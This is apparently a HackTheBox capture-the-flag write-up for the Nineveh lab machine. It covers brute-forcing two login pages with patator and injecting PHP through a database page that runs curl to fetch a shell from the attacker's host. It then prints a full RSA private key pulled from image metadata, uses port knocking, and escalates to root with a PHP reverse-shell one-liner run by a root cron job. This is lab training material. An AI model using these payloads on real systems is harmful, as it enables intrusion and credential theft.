---
title:  "Nineveh HackTheBox CTF Writeup"
date:   2017-12-16 15:04:23
categories: [CTF]
tags: [HackTheBox, CTF, Hacking, Ethical Hacking, WarGames]
---

![](https://cdn-images-1.medium.com/max/800/1*krsVTfRcMPLKizwFDlNn6g.jpeg)

Welcome to my write up for the Nineveh box from [HackTheBox.eu](https://www.hackthebox.eu/) !
Hack The Box is an online platform that allows you to test your penetration testing skills and exchange ideas and methodologies with other members of similar interests. It contains several challenges that are constantly updated.
As an individual, you can complete a simple challenge to prove your skills and then create an account, allowing you to connect to our private network (HTB Labs) where several machines await for you to hack them.
If you want to jack some boxes yourself, try to [hack the invite code](https://www.hackthebox.eu/invite) in order to become a member and get involved. It is a lot of fun!

Without any more talk, lets proceed to the Nineveh CTF and my writeup of the penetration tests I ran against it. Please comment with any questions!

Target Machine: `10.10.10.43`


**Reconnaissance**

     Nmap -A 10.10.10.43
    80/tcp open http Apache httpd 2.4.18 ((Ubuntu))
    |_http-title: Site doesn’t have a title (text/html).
    443/tcp open ssl/http Apache httpd 2.4.18 ((Ubuntu))
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Site doesn’t have a title (text/html).
    | ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
    | Not valid before: 2017–07–01T15:03:30
    |_Not valid after: 2018–07–01T15:03:30
    |_ssl-date: TLS randomness does not represent time

These are the files we find on port 80


    DirBuster 1.0-RC1 — Report
    http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
    Report produced on Wed Oct 18 01:44:50 EDT 2017
     — — — — — — — — — — — — — — — —
    http://10.10.10.43:80
     — — — — — — — — — — — — — — — —
    Directories found during testing:
    Dirs found with a 200 response:
    /
    /department/
    /department/css/
    /department/files/
    Dirs found with a 403 response:
    /icons/
    /icons/small/
    /server-status/

     — — — — — — — — — — — — — — — —
    Files found during testing:
    Files found with a 200 responce:
    /info.php
    /department/login.php
    /department/index.php
    /department/header.php
    /department/footer.php
    /department/css/index.php
    /department/files/index.php
    Files found with a 302 responce:
    /department/logout.php
    /department/manage.php
    — — — — — — — — — — — — — — — —
![](https://cdn-images-1.medium.com/max/1000/1*Nucuh2lhuHNoIc8rYlzClQ.png)


I brute forced the login page with the username admin and got two possible passwords `1q2w3e4r5t` and `computador`

    patator http_fuzz url=”http://10.10.10.43/department/login.php" method=POST body=’username=admin&password=FILE0' 0=rockyou.txt follow=1 accept_cookie=1 -x ignore:fgrep=’Invalid Password!’ -x quit:fgrep=’Hi admin’
    12:33:56 patator INFO — Starting Patator v0.6 (http://code.google.com/p/patator/) at 2017–10–19 12:33 EDT
    12:33:58 patator INFO —
    12:33:58 patator INFO — code size:clen time | candidate | num | mesg
    12:33:58 patator INFO — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — -
    12:35:15 patator INFO — 200 3332:1058 0.263 | 1q2w3e4r5t | 4553 | HTTP/1.1 200 OK
    12:35:15 patator INFO — 200 1623:1058 0.259 | computador | 4563 | HTTP/1.1 200 OK
    12:35:15 patator INFO — Hits/Done/Skip/Fail/Size: 2/4600/0/0/14344392, Avg: 59 r/s, Time: 0h 1m 17s
    12:35:15 patator INFO — To resume execution, pass — resume 458,456,457,462,458,464,453,460,466,466
![](https://cdn-images-1.medium.com/max/800/1*jt9IfXmjiB3vl-1dZe0BJw.png)


Once we log in we can see that we have access to “Notes”

![](https://cdn-images-1.medium.com/max/800/1*ZMaJImmJb9p83Y-MEh2XJA.png)


Notes is displaying the content of some file stored somewhere in the system named ninevehNotes.txt and seems to be vulnerable to directory traversal attack…
These are the files we find on port 443


    DirBuster 1.0-RC1 — Report
    http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
    Report produced on Thu Oct 19 12:26:15 EDT 2017
     — — — — — — — — — — — — — — — —
    https://10.10.10.43:443
     — — — — — — — — — — — — — — — —
    Directories found during testing:
    Dirs found with a 200 response:
    /
    /db/
    Dirs found with a 403 response:
    /icons/
    /icons/small/
     — — — — — — — — — — — — — — — —
    Files found during testing:
    Files found with a 200 responce:
    /db/index.php
     — — — — — — — — — — — — — — — —
![](https://cdn-images-1.medium.com/max/1000/1*rVB_EpP_aOFJ2yXeYPgaZw.png)


I brute forced the password field on /db/index.php with patator and I got the password `password123`

    patator http_fuzz url=”https://10.10.10.43/db/index.php" method=POST body=’password=FILE0&login=Log+In&proc_login=true’ 0=rockyou.txt follow=1 accept_cookie=1 -x ignore:fgrep=’Incorrect password.’ -x quit:fgrep=’test’
    12:31:53 patator INFO — Starting Patator v0.6 (http://code.google.com/p/patator/) at 2017–10–19 12:31 EDT
    12:32:01 patator INFO —
    12:32:01 patator INFO — code size:clen time | candidate | num | mesg
    12:32:01 patator INFO — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — -
    12:32:43 patator INFO — 200 16224:-1 0.506 | password123 | 1384 | HTTP/1.1 200 OK
![](https://cdn-images-1.medium.com/max/1000/1*1OO-r2xSUNQmmGoeDg6h_g.png)


Once I logged into the database I created a table named `ninevehNotes.txt`inside the `ninevehNotes.txt` database. Something useful to note is the path where the database files are being store.
Path to database:`/var/tmp/NinevehNotes.txt`
Now that we know the path I’m going to create a simple php script that calls home and downloads a php file from my server into the victims machine.

    <?php system(“curl http://10.10.14.35:8080/sshell.php -o /var/tmp/ninevehNotes12.php”); ?>

When you’re setting up the database table you need to change the type from INT to TXT and the “Default Value” to the php script then just create the query. The php script is just calling the system function which allows you to execute shell commands through php it then executes curl to download the file `[sshell.php](http://10.10.14.35:8080/sshell.php)` to /var/tmp/ as `ninevehNotes12.php` since we know that we can write there might as well put the shell there for now.

![](https://cdn-images-1.medium.com/max/1000/1*B2XlAeMF54VqPPB07guk1w.png)


I created a SimpleHTTPServer with python on port 8080 with my reverse shell. To execute the file we need to visit the file uploaded in /var/tmp/ which is ninevehNotes.txt. That should execute the content of ninevehNotes.txt which is the php code downloading the reverse shell and outputting it as ninevehNotes12.php
We can use [http://10.10.10.43//department/manage?manage](http://10.10.10.43//department/login.php)=files/ninevehNotes.txt to execute our file.

![](https://cdn-images-1.medium.com/max/1000/1*QE_R3lfZS4--foPy-tXUvw.png)


Now all we have to do is set up a netcat listener and execute the file we uploaded to the system ninevehNotes12.php an we should get a shell if we now execute `ninevehNotes12.php`.

![](https://cdn-images-1.medium.com/max/1000/1*Tw4hbPUrTnrDme2XArkqEA.png)


Once we get the reverse shell I tried getting the user flag but couldn’t because www-data didn’t have permissions to read the file we need to elevate our privileges. I did some enumeration on the system and found `/var/www/ssl/secure_notes` there was a photo named nineveh.png that had a private key embedded in the metada.

    strings -n 8 nineveh.png
    00000000000
    13126060277
    www-data
    www-data
    secret/nineveh.priv
    00000003213
    13126045656
    www-data
    www-data
     — — -BEGIN RSA PRIVATE KEY — — -
    MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
    H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
    PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
    FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
    3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
    X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
    KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
    FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
    GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
    JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
    9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
    Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
    ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
    1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
    vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
    DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
    P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
    fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
    tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
    iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
    MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
    PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
    i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
    il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
    fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
     — — -END RSA PRIVATE KEY — — -
    secret/nineveh.pub
    00000000620
    13126060277
    www-data
    www-data
    ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb

I tried logging into ssh with the private key although it was not listed as listening and it didn’t work.

![](https://cdn-images-1.medium.com/max/600/1*9sE2DFGvgMc3MHytdN_EDg.gif)


I kept enumerating the system I found /etc/knockd.conf
[openSSH]
 sequence = 571,290,911
Port knocking is a simple method to grant remote access without leaving a port constantly open. This preserves your server from port scanning and script kiddie attacks.
To utilize port knocking, the server must have a firewall and run the knock-daemon. As the name conveys, the daemon is listening for a specific sequence of TCP or UDP “knocks”. If the sequence is given correctly, then a command is executed; typically the source IP address is given access through the firewall to the port of an application (such as SSH). Port knocking improves security, because it can remove the need to leave ports open. The knock-daemon is located at a very low level in the TCP/IP stack, does not require any open ports, and is invisible to potential attackers.
I used this little for loop open the sesame

    for x in 571 290 911; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x 10.10.10.43; done

after the nmap scans is finished through those sequences you are allowed to ssh into the machine with the private key. Now that we have a regular shell as the user `amrois` now we should be able to get the user flag!

![](https://cdn-images-1.medium.com/max/800/1*g4AdKW6nPlGOatOicRU1Sg.gif)


GOT USER FLAG!

Time for privilege escalation, I started browsing through the root directories directories and I found a folder name report, this folder would create a report of chkrootkit every minute when chkrootkit is executed the file ‘`/tmp/update`’ executes with the permissions of user who launched Chkrootkit and Chkrootkit is being executed by root, I created a file named update in /tmp and with the following content…

    php -r ‘$sock=fsockopen(“10.10.x.x”,4545), exec(“/bin/sh -i <&3 >&3 2>&3”);’

Gave it execute permissions and then open a new nc instance on port 4545 after a minute I got a shell as root.

![](https://cdn-images-1.medium.com/max/1000/1*jqNiWH88Edn5XiXkDciG0g.png)

![](https://cdn-images-1.medium.com/max/800/1*CNv4IjYVeBjdOBGvHJV0Ng.gif)


You can follow me on twitter [@0katz](https://www.twitter.com/0katz)

## #TogetherWeHitHarder
